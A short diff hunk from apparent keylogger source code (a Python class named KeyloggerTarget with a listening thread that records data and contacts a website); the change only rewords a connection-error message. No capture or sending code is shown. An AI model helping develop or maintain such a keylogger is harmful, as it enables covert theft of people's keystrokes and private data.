@@ -246,7 +246,7 @@ class KeyloggerTarget:
                         break
 
                     except requests.exceptions.ConnectionError:
-                        print("No connection")
+                        print("This website is not availible")
                         sys.exit()
 
             listening_thread = threading.Thread(target=self.daten_aufnehemen)
